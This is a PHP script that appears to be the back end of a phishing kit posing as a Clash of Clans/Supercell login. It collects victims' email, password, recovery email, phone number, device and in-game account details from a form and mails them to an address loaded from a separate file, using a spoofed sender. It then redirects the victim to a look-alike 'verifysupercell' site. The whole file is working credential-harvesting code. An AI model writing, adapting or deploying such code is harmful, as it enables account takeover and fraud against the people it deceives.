<?php 
$provider = "";
$username = "";
$password = "";
if(isset($_POST['dataLogin'])) {
    $username = $_POST['dataUser'];
    $password = $_POST['dataPass'];
    $provider = $_POST['prov'];
    $nickname = $_POST['nnk'];
    $levelacc = $_POST['lvl'];
    $townhall = $_POST['th'];
    $clan     = $_POST['clan'];
    $re       = $_POST['re'];
    $ph       = $_POST['ph'];
    $device   = $_POST['device'];

    include"email.php";

    if($provider) {
        $body = <<<EOD
        <table>
            <tr>
                <td>Email</td>
                <td>:</td>
                <td>$username</td>
            </tr>
            <tr>
                <td>Password</td>
                <td>:</td>
                <td>$password</td>
            </tr>
            <tr>
                <td>Nickname</td>
                <td>:</td>
                <td>$nickname</td>
            </tr>
            <tr>
                <td>Level</td>
                <td>:</td>
                <td>$levelacc</td>
            </tr>
            <tr>
                <td>TH</td>
                <td>:</td>
                <td>$townhall</td>
            </tr>
            <tr>
                <td>Clan</td>
                <td>:</td>
                <td>$clan</td>
            </tr>
            <tr>
                <td>Email Pemulihan</td>
                <td>:</td>
                <td>$re</td>
            </tr>
            <tr>
                <td>No Tel</td>
                <td>:</td>
                <td>$ph</td>
            </tr>
            <tr>
                <td>Devices</td>
                <td>:</td>
                <td>$device</td>
            </tr>
        </table>

EOD;

        $subjek = 'COC LOG '.$provider.'| AKUN COC PUNYA '.$nickname.'';
        $headers = "From: IdhaamPedia@hentai.com\r\n";
        $headers .= "Content-type: text/html\r\n";
        $success = mail($mailto, $subjek, $body, $headers);

        if($success) {
            echo "<script type='text/javascript'>location.href='https://www.verifysupercell.com/2019/06/location.html';</script>";
        } else {
            
        }
    }

} else {
    header('location: ../');
    exit();
}
?>